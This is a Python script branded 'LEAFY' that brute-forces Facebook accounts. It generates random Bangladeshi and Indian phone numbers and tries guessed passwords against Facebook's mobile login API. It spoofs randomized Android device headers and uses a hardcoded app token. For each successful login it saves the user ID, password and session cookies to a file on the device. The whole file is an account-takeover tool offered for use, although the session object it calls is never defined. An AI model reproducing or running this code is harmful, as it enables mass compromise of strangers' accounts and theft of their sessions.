""" Decompiled by Exotic Hridoy """

import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import platform
import uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime
from bs4 import BeautifulSoup

user = []
loop = 0
oks = []
cps = []
twf = []
done = False

O = '\033[0m'
G = '\033[38;5;46m'
W = '\033[38;5;208m'
__M = '\033[5;44m\033[5;37m'
___M = '\033[5;41m\033[5;37m'
____M = '\033[5;42m\033[5;31m'
_____M = '\033[5;47m\033[5;30m'

logo = '''\033[0m
  _____     ________       _       ________  ____  ____
 |_   _|   |_   __  |     / \\     |_   __  ||_  _||_  _|
\033[38;5;46m   | |       | |_ \\_|    / _ \\      | |_ \\_|  \\ \\  / /
   | |   _   |  _| _    / ___ \\     |  _|      \\ \\/ /
 \033[0m _| |__/ | _| |__/ | _/ /   \\ \\_  _| |_       _|  |_
 |________||________||____| |____||_____|     |______|
\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     \033[5;44m\033[5;37m f \033[0m MARUFUL HAQUE MUHIB \033[38;5;208m! \033[5;42m\033[5;31m ● \033[0m LEAFY \033[38;5;208m> \033[0m0.0.1
\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'''

def __lipi__():
    os.system('clear')
    print(logo)
    print(f' {O}[{G}×{O}]{G} RANDOM BD {W}[{O}1{G}!{O}A{W}]{G} IND {W}[{O}2{G}!{O}B{W}]', end=' ')
    __s__ = input(f'{O}  : {G}')
    if __s__ in ['1', '01', 'A', 'a']:
        _bd_()
    if __s__ in ['2', '02', 'B', 'b']:
        _ind_()
    else:
        time.sleep(3)
        __lipi__()

def _bd_():
    try:
        code = input(f' {O}[{G}×{O}] {W}CODE {G} 017 {W}! {G}019 {W}!{G} 018 {W}!{G}016  {O}: {G}')
    except:
        code = '017'
    try:
        limit = int(input(f' {O}[{G}×{O}]{W} LIMIT{G} 1000 {W}! {G}6000 {W}!{G} 10000   {O}: {G}'))
    except:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as __sub__:
        tl = str(len(user))
        print('\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], 'free fire', 'mababa', 'taniya', 'sumaiya', 'saiful', 'jannatul', 'Fatema', 'farjana', 'sabbir', 'humaira', 'alamin', 'mimmim', 'hridoy', 'fariya', 'shakil', '708090']
            ids = code + love
            __sub__.submit(___mixt___, ids, pwx, tl)
    print(' \n\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
    exit()

def _ind_():
    try:
        code = input(f' {O}[{G}×{O}] {W}CODE {G} 620 {W}! {G}720 {W}!{G} 639 {W}!{G} 760 {O}: {G}')
    except:
        code = '620'
    try:
        limit = int(input(f' {O}[{G}×{O}]{W} LIMIT{G} 1000 {W}! {G}6000 {W}!{G} 10000   {O}: {G}'))
    except:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as __sub__:
        tl = str(len(user))
        print('\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], '57575752', '57575751', '57273200', '59039200', 'samgna']
            ids = '+91' + code + love
            __sub__.submit(___mixt___, ids, pwx, tl)
    print(f' \n\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {O}[{G}×{O}] {G}TOTAL OK ID YOU GET : {len(oks)}  ')
    print(' \n\033[38;5;61m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
    exit()

def ___mixt___(ids, pwv, tl):
    global loop
    global oks
    sys.stdout.write(f'\r {O}[{G}DETECTING{O}] {W}× {O}[{G}{loop}{O}] {W}× {O}[{G}{len(oks)}{O}] ')
    sys.stdout.flush()
    try:
        for pas in pwv:
            list_ABC123 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            A2 = str(''.join([random.choice(list_ABC123) for _ in range(4)]))
            model_ = 'SM-' + str(random.randint(100, 999))
            rand_name_ = random.choice(['Samsung', 'Kaios', 'Realme', 'Nokia', 'infinix'])
            width_ = random.randint(320, 1080)
            height_ = random.randint(480, 1920)
            _density = random.choice(['1.5', '1.0', '1.25', '1.75', '2.0', '2.5', '3.0'])
            application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            application_version_code = str(random.randint(0, 999999999))
            fbs = random.choice(['com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite'])
            android_version = str(random.randrange(4, 13))
            ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; V17 Build/{str(A2)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/' + f'{{density=3.0,width=1080,height=1920}}' + f';FBLC/en_US;FBCR/null;FBMF/Vivo;FBBD/Vivo;FBPN/{str(fbs)};FBDV/V17;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_clai	wms': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'GB', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate'}
            head = {'User-Agent': ua_string, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            po = muhib.post('https://b-graph.facebook.com/auth/login', data=data, headers=head, allow_redirects=False).json()
            if 'access_token' in po:
                coki = po['session_cookies']
                cok = {}
                for x in coki:
                    cok.update({x['name']: x['value']})
                kuki = ';'.join(['%s=%s' % (key, value) for key, value in cok.items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {O}[{G}LEAFY{W}×{G}OK{O}] {G}{uid} {W}!{G} {pas} ')
                oks.append(uid)
                open('/sdcard/LEAFY-OK.txt', 'a').write(uid + '|' + pas + '|' + kuki + '\n')
                break
        loop += 1
    except Exception as e:
        return None

__lipi__()
